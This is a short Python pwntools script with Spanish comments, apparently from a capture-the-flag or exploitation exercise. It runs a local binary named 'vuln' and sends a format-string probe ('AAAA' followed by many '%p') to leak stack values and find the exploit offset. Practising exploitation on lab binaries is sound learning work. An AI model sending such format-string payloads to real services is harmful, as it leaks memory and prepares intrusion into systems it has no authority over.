#!/usr/bin/env python3
from pwn import *

# Crear proceso local
p = process('./vuln')

# Esperar el prompt
p.recvuntil(b'What do you have to say?\n')

# Enviar payload para encontrar offset
# Enviamos AAAA seguido de muchos %p
payload = b'AAAA' + b'.%p' * 30

p.sendline(payload)

# Recibir respuesta
response = p.recvall(timeout=2)
print(response.decode())

p.close()
